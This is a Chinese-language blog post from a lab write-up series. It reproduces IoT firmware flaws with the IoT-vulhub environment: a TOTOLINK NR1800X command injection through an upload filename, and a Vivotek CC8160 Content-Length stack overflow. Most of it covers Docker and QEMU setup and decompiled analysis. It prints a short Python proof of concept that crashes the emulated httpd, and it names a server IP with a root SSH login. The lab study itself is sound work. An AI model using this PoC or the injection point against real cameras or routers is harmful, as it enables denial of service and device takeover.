@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+  <title>
+    
+    Iot-vulhub复现 丨
+    
+
+    tw11ty&#39;s Blog
+  </title>
+
+  
+  <link rel="shortcut icon" href="/icon.svg">
+  
+
+  <link rel="preconnect" href="https://cdnjs.cloudflare.com">
+  
+  <link id="theme" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-light.css">
+  <script src="https://unpkg.com/@highlightjs/cdn-assets@11.9.0/highlight.min.js"></script>
+  
+
+  <!-- 字体 -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+
+  
+<link rel="stylesheet" href="/css/root.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/post.css">
+
+</head>
+
+<body>
+  <header class="header">
+  <section class="header-container">
+    <a class="logo" href="/">tw11ty</a>
+    <ul class="nav">
+      
+      <li><a href="/archives">归档</a></li>
+      
+      <li><a href="/about">关于</a></li>
+      
+      <li><a href="/group">友链</a></li>
+      
+    </ul>
+  </section>
+</header>
+  <main class="main">
+    <article class="post">
+  
+  <div class="post-title">Iot-vulhub复现</div>
+  <div class="post-meta">
+    <div class="date">2024 June 25th</div>
+    <div class="tags">
+      
+      <div class="tag-item">IOT</div>
+      
+    </div>
+  </div>
+  
+
+  <main class="post-content"><p>借着逆向课的作业，就借此机会来学习并复现iot固件漏洞。网上搜集资料找到了<a target="_blank" rel="noopener" href="https://github.com/Vu1nT0tal/IoT-vulhub">Vu1nT0tal&#x2F;IoT-vulhub: IoT固件漏洞复现环境 (github.com)</a>，感觉该项目对0基础入门iot固件漏洞复现是蛮有帮助的，就以此对相关漏洞进行复现。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://wsxk.github.io/IotVulhub/">IoT-vulhub 漏洞复现 – wsxk’s blog – 小菜鸡</a></p>
+<p><a target="_blank" rel="noopener" href="https://brvc3.github.io/2023/03/15/IoT-Vulhub%E5%9F%BA%E7%A1%80%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">IoT-Vulhub基础环境搭建 | Brvc3’s Base</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13430?time__1311=Gqmxu7G=5iq05DK5YK0=Tit0nnQbDcD=roD">IoT-vulhub 漏洞复现(一):Vivotek远程栈溢出漏洞 - 先知社区 (aliyun.com)</a></p>
+</blockquote>
+<p>由于我的服务器是国内的，所以构建过程会有很多麻烦，而且dockerhub也g了……</p>
+<h1 id="环境构建"><a href="#环境构建" class="headerlink" title="环境构建"></a>环境构建</h1><p>docker拉取问题解决：<a target="_blank" rel="noopener" href="https://github.com/DaoCloud/public-image-mirror?tab=readme-ov-file">https://github.com/DaoCloud/public-image-mirror?tab=readme-ov-file</a></p>
+<h2 id="基础环境构建"><a href="#基础环境构建" class="headerlink" title="基础环境构建"></a>基础环境构建</h2><p> 构建 ubuntu1604 基础镜像</p>
+<blockquote>
+<p>cd baseImage&#x2F;ubuntu1604 &amp;&amp; docker build -t firmianay&#x2F;ubuntu1604 .</p>
+</blockquote>
+<p> 构建 binwalk 容器</p>
+<blockquote>
+<p>cd baseImage&#x2F;binwalk &amp;&amp; docker build -t firmianay&#x2F;binwalk .</p>
+</blockquote>
+<h2 id="漏洞环境构建"><a href="#漏洞环境构建" class="headerlink" title="漏洞环境构建"></a>漏洞环境构建</h2><p>初始化环境（arm&#x2F;mips&#x2F;mipsel）</p>
+<blockquote>
+<p>.&#x2F;init_env.sh xxxx</p>
+</blockquote>
+<p>自动化编译环境，看有什么docker-compose就知道支持什么了</p>
+<blockquote>
+<p>docker-compose -f docker-compose-user.yml build         # QEMU 用户模式模拟</p>
+<p>docker-compose -f docker-compose-system.yml build       # QEMU 系统模式模拟</p>
+<p>docker-compose -f docker-compose-firmadyne.yml build    # firmadyne 模拟</p>
+<p>docker-compose -f docker-compose-firmae.yml build       # firmae 模拟（方便调试）</p>
+</blockquote>
+<p>启动环境</p>
+<blockquote>
+<p>docker-compose -f docker-compose-xxxx.yml up</p>
+</blockquote>
+<p>删除环境</p>
+<blockquote>
+<p>docker-compose -f docker-compose-xxxx.yml down -v</p>
+</blockquote>
+<h1 id="TOTOLINK-NR1800X-CVE-2022-41518"><a href="#TOTOLINK-NR1800X-CVE-2022-41518" class="headerlink" title="TOTOLINK NR1800X (CVE-2022-41518)"></a>TOTOLINK NR1800X (CVE-2022-41518)</h1><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1995/">TOTOLINK NR1800X 系列 CVE 分析 (seebug.org)</a></p>
+<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><ul>
+<li>docker：攻击、调试主机：192.168.2.1</li>
+<li>qemu-system：固件主机：192.168.2.2</li>
+<li>镜像依赖：<code>firmianay/ubuntu1604 -&gt; firmianay/qemu-system:mipsel</code></li>
+</ul>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>解压提取固件：</p>
+<blockquote>
+<p>docker run –rm -v $PWD&#x2F;firmware&#x2F;:&#x2F;root&#x2F;firmware firmianay&#x2F;binwalk -Mer “&#x2F;root&#x2F;firmware&#x2F;TOTOLINK_NR1800X_B20210910_ALL.bin”</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251903763.png" alt="image-20240623135537006"></p>
+<p>查看文件相关信息  32位 小端序 mips架构</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251903687.png" alt="image-20240623135819202"></p>
+<p>1.构建、启动漏洞环境：</p>
+<pre><code class="highlight plaintext">./init_env.sh mipsel
+docker-compose -f docker-compose-system.yml build</code></pre>
+
+<p>a.缺少firmianay&#x2F;qemu-system:mipsel，自行本地构建，去到对应的文件夹IoT-vulhub-master&#x2F;baseImage&#x2F;qemu-system&#x2F;mipsel创建镜像</p>
+<pre><code class="highlight plaintext">docker build -t firmianay/qemu-system:mipsel .</code></pre>
+
+<p>b.构建时COPY命令出错，由于高版本docker会对文件名检测，需要修改Dockerfile</p>
+<pre><code class="highlight Dockerfile">Step <span class="number">4</span>/<span class="number">8</span> : <span class="keyword">COPY</span><span class="language-bash"> ./firmware/_*/squashfs-root /root/squashfs-root</span>
+ERROR: Service <span class="string">&#x27;system-emu&#x27;</span> failed to build: When using <span class="keyword">COPY</span><span class="language-bash"> with more than one <span class="built_in">source</span> file, the destination must be a directory and end with a /</span></code></pre>
+
+<p>c.将firmware下子文件夹内的squashfs-root提取到firmware里，修改Dockerfile的步骤为  COPY .&#x2F;firmware&#x2F;squashfs-root &#x2F;root&#x2F;squashfs-root</p>
+<pre><code class="highlight plaintext">cp -r ./_TOTOLINK_NR1800X_B20210910_ALL.bin.extracted/squashfs-root/ ./</code></pre>
+
+<p>2.启动容器</p>
+<pre><code class="highlight plaintext">docker-compose -f docker-compose-system.yml up</code></pre>
+
+<p>d.运行爆错TOTO-system   | &#x2F;bin&#x2F;sh: 1: .&#x2F;run.sh: Permission denied，服务没起起来</p>
+<blockquote>
+<p>Dockerfile中添加  RUN chmod +x &#x2F;bin&#x2F;run.sh</p>
+</blockquote>
+<p>e.重新构建启动，会爆缺少debian_wheezy_mipsel_standard.qcow2文件，这是在我们qwmu-system构建时(a步骤)中进行构建，我们需要本地下载下来，重新走一遍12步骤</p>
+<blockquote>
+<p>修改&#x2F;iot_hub&#x2F;IoT-vulhub-master&#x2F;baseImage&#x2F;qemu-system&#x2F;mipsel&#x2F;images&#x2F;download.sh，原链接改为<a target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu/mipsel/">https://people.debian.org/~aurel32/qemu/mipsel/</a></p>
+</blockquote>
+<pre><code class="highlight plaintext">vim ./download.sh
+#!/bin/bash
+
+# 3.2.0
+wget https://people.debian.org/~aurel32/qemu/mipsel/debian_wheezy_mipsel_standard.qcow2
+wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta
+
+# 2.6.32
+wget https://people.debian.org/~aurel32/qemu/mipsel/debian_squeeze_mipsel_standard.qcow2
+wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-2.6.32-5-4kc-malta
+
+./download.sh</code></pre>
+
+<p>服务启动成功！</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251902277.png" alt="image-20240623143052731"></p>
+<p>3.开启ssh隧道</p>
+<p>本地使用ssh创建socks代理，然后浏览器配置代理</p>
+<pre><code class="highlight plaintext">ssh -D 10007 root@124.221.122.67 -p 1234</code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251903524.png" alt="image-20240623153609456"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251903795.png" alt="image-20240623152246628"></p>
+<p>成功访问服务路由</p>
+<p>运行exp.py，打通</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251903991.png" alt="image-20240623153513904"></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>CVE-2022-41525的成因是cstecgi.cgi的doSystem过滤不严谨，将cstecgi.cgi 传下来进行分析</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251902852.png" alt="image-20240623153858761"></p>
+<p>通过dosystem交叉调用寻找漏洞点，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251904405.png" alt="image-20240623154248447"></p>
+<p>ida不支持mips的反汇编，需要下载Retdec插件，但是有点大了，所以我使用ghidra进行反编译</p>
+<p>&#x2F;cgi-bin&#x2F;cstecgi.cgi 的 UploadFirmwareFile 函数，其参数FileName参数可控，并且将作为doSystem的参数被执行。</p>
+<p>这个命令注入不需要进行绕过。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251902945.png" alt="image-20240623164123142"></p>
+<h1 id="Vivotek-CC8160-栈溢出漏洞"><a href="#Vivotek-CC8160-栈溢出漏洞" class="headerlink" title="Vivotek CC8160 栈溢出漏洞"></a>Vivotek CC8160 栈溢出漏洞</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5054?time__1311=n4+xnD07iti=j2DBqooGkYd0QeG=Q8DRjoD&alichlgref=https://xz.aliyun.com/t/5054#toc-4">Vivotek远程栈溢出漏洞分析与复现 - 先知社区 (aliyun.com)</a></p>
+<h2 id="漏洞环境-1"><a href="#漏洞环境-1" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><ul>
+<li>docker：攻击、调试主机：192.168.2.1</li>
+<li>qemu-system：固件主机：192.168.2.2</li>
+<li>httpd（有漏洞服务）：192.168.2.2:80</li>
+<li>镜像依赖：<code>firmianay/ubuntu1604 -&gt; firmianay/qemu-system:armel</code></li>
+</ul>
+<h2 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>在漏洞路径下  使用 firmianay&#x2F;binwalk 解压固件</p>
+<blockquote>
+<p>docker run –rm -v $PWD&#x2F;firmware&#x2F;:&#x2F;root&#x2F;firmware firmianay&#x2F;binwalk -Mer “&#x2F;root&#x2F;firmware&#x2F;DIR822A1_FW103WWb03.bin”</p>
+</blockquote>
+<h3 id="用户模拟"><a href="#用户模拟" class="headerlink" title="用户模拟"></a>用户模拟</h3><p>构建并启动漏洞环境:</p>
+<blockquote>
+<p>docker-compose -f docker-compose-user.yml build</p>
+</blockquote>
+<p>这里构建环境出现问题缺少firmianay&#x2F;qemu-user-static 镜像文件，docker.io中没有对应的镜像文件，我们需要到~&#x2F;iot_hub&#x2F;IoT-vulhub-master&#x2F;baseImage&#x2F;qemu-user-static里面自行构建</p>
+<blockquote>
+<p>cd ~&#x2F;iot_hub&#x2F;IoT-vulhub-master&#x2F;baseImage&#x2F;qemu-user-static</p>
+<p>docker build -t firmianay&#x2F;qemu-user-static.</p>
+</blockquote>
+<p>然后就能成功在本地构建镜像</p>
+<p>重新构建启动容器，能够成功运行服务</p>
+<blockquote>
+<p>docker-compose -f docker-compose-user.yml build</p>
+<p>docker-compose -f docker-compose-user.yml up</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251859341.png" alt="image-20240625185942262"></p>
+<h3 id="系统模拟"><a href="#系统模拟" class="headerlink" title="系统模拟"></a>系统模拟</h3><p>先自行构建qemu-system镜像</p>
+<pre><code class="highlight shell">cd ~/iot_hub/IoT-vulhub-master/baseImage/qemu-system/armel/images
+./download.sh   #记得改链接
+<span class="meta prompt_"></span>
+<span class="meta prompt_">#</span><span class="language-bash">镜像构建</span>
+docker build -t firmianay/qemu-system:$&#123;ARCH&#125; .
+</code></pre>
+
+<p>如果构建qemu-system时gef拉取不下来就注释掉</p>
+<p> 然后跟着手册走</p>
+<p>输入poc发现系统服务dump了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251900140.png" alt="image-20240622212015099"></p>
+<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>固件解包后查看漏洞文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251923337.png" alt="image-20240625192328286"></p>
+<p>漏洞分析：</p>
+<p>漏洞点位于&#x2F;usr&#x2F;sbin&#x2F;httpd中的sub_17F80，由于Content-Length引起的溢出</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251953973.png" alt="image-20240625195352919"></p>
+<p>uVar6是 “Content-Length” 的初始地址</p>
+<p>通过strncpy来将 &amp;local_38的   iVar3 - (iVar4 + 1)   字节数据copy到 iVar4 + 1</p>
+<p>而iVar3 、4是在字符串中“\n”和“:”首次出现的地址，二者之间也就是输入的消息</p>
+<p>程序没有对Content-length字段进行校验，直接将输入的消息赋值给了local_38中，而local_38距离栈底只有0x38字节</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406252002547.png" alt="image-20240625200208487"></p>
+<p>poc</p>
+<pre><code class="highlight python"><span class="comment">#!usr/bin/python</span>
+<span class="keyword">from</span> pwn <span class="keyword">import</span> *
+<span class="keyword">import</span> requests
+
+header = &#123;
+	<span class="string">&quot;Content-Length&quot;</span>:<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&quot;</span>
+&#125;
+
+url = <span class="string">&quot;http://192.168.2.2&quot;</span> + <span class="string">&quot;/cgi-bin/admin/upgrade.cgi&quot;</span>
+
+
+session = requests.session()
+session.post(url, headers=header)</code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<p>—&gt;后续完善ing</p>
+</main>
+
+</article>
+
+
+<script src="/js/highlight.js"></script>
+
+  </main>
+  <footer class="footer">
+  
+  <span>Copyright © 2024 typo</span>
+  
+</footer>
+  
+<script src="/js/theme.js"></script>
+
+</body>
+
+</html>
